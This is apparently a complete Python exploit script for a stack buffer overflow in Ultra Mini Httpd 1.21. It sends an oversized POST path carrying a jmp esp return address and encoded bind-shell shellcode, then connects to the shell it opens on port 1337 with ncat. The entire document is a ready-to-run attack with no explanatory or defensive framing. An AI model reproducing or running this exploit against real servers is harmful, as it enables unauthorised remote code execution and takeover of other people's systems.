#!/usr/bin/python
# Crashed with 6000 bytes
# Using NTDLL for jmp esp
# Connects to port 1337
# Bad characters are "\x00\x09\x0a\x0b\x0c\x0d\x20"
# Resulting payload is 375 bytes

import socket
from sys import argv
from time import sleep
from subprocess import call
from struct import pack

host = argv[1]

shell =  ""
shell += "\x9f\xfd\xf9\x41\xf8\x4a\x9b\x92\x27\xf9\x48\xf8\x92"
shell += "\xfd\x93\x43\x9b\x90\x4b\x49\xda\xc4\xd9\x74\x24\xf4"
shell += "\xbf\x44\x4f\xb2\xe1\x5d\x33\xc9\xb1\x53\x31\x7d\x17"
shell += "\x83\xed\xfc\x03\x39\x5c\x50\x14\x3d\x8a\x16\xd7\xbd"
shell += "\x4b\x77\x51\x58\x7a\xb7\x05\x29\x2d\x07\x4d\x7f\xc2"
shell += "\xec\x03\x6b\x51\x80\x8b\x9c\xd2\x2f\xea\x93\xe3\x1c"
shell += "\xce\xb2\x67\x5f\x03\x14\x59\x90\x56\x55\x9e\xcd\x9b"
shell += "\x07\x77\x99\x0e\xb7\xfc\xd7\x92\x3c\x4e\xf9\x92\xa1"
shell += "\x07\xf8\xb3\x74\x13\xa3\x13\x77\xf0\xdf\x1d\x6f\x15"
shell += "\xe5\xd4\x04\xed\x91\xe6\xcc\x3f\x59\x44\x31\xf0\xa8"
shell += "\x94\x76\x37\x53\xe3\x8e\x4b\xee\xf4\x55\x31\x34\x70"
shell += "\x4d\x91\xbf\x22\xa9\x23\x13\xb4\x3a\x2f\xd8\xb2\x64"
shell += "\x2c\xdf\x17\x1f\x48\x54\x96\xcf\xd8\x2e\xbd\xcb\x81"
shell += "\xf5\xdc\x4a\x6c\x5b\xe0\x8c\xcf\x04\x44\xc7\xe2\x51"
shell += "\xf5\x8a\x6a\x95\x34\x34\x6b\xb1\x4f\x47\x59\x1e\xe4"
shell += "\xcf\xd1\xd7\x22\x08\x15\xc2\x93\x86\xe8\xed\xe3\x8f"
shell += "\x2e\xb9\xb3\xa7\x87\xc2\x5f\x37\x27\x17\xf5\x3f\x8e"
shell += "\xc8\xe8\xc2\x70\xb9\xac\x6c\x19\xd3\x22\x53\x39\xdc"
shell += "\xe8\xfc\xd2\x21\x13\x07\x1a\xaf\xf5\x6d\x4c\xf9\xae"
shell += "\x19\xae\xde\x66\xbe\xd1\x34\xdf\x28\x99\x5e\xd8\x57"
shell += "\x1a\x75\x4e\xcf\x91\x9a\x4a\xee\xa5\xb6\xfa\x67\x31"
shell += "\x4c\x6b\xca\xa3\x51\xa6\xbc\x40\xc3\x2d\x3c\x0e\xf8"
shell += "\xf9\x6b\x47\xce\xf3\xf9\x75\x69\xaa\x1f\x84\xef\x95"
shell += "\x9b\x53\xcc\x18\x22\x11\x68\x3f\x34\xef\x71\x7b\x60"
shell += "\xbf\x27\xd5\xde\x79\x9e\x97\x88\xd3\x4d\x7e\x5c\xa5"
shell += "\xbd\x41\x1a\xaa\xeb\x37\xc2\x1b\x42\x0e\xfd\x94\x02"
shell += "\x86\x86\xc8\xb2\x69\x5d\x49\xd2\x8b\x77\xa4\x7b\x12"
shell += "\x12\x05\xe6\xa5\xc9\x4a\x1f\x26\xfb\x32\xe4\x36\x8e"
shell += "\x37\xa0\xf0\x63\x4a\xb9\x94\x83\xf9\xba\xbc"

payload = "A" * 5412 + pack('<L', 0x7C91FCD8) + shell

buf = "POST /{} HTTP/1.1\r\n".format(payload)
buf += "Host: {}\r\n\r\n".format(host)

print "[x] Exploiting Ultra Mini Httpd 1.21..."
try: 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, 80))
	print "[x] Sending exploit to {}".format(host)
	s.send(buf)
	print "[x] Attempting to connect...\n"
	try: 
		sleep(1)
		call(["ncat", host, "1337"])
	except: 
		print "[!] Couldn't connect. Maybe exploit failed?"
except:
	print "[!] Couldn't connect. Maybe exploit failed?"
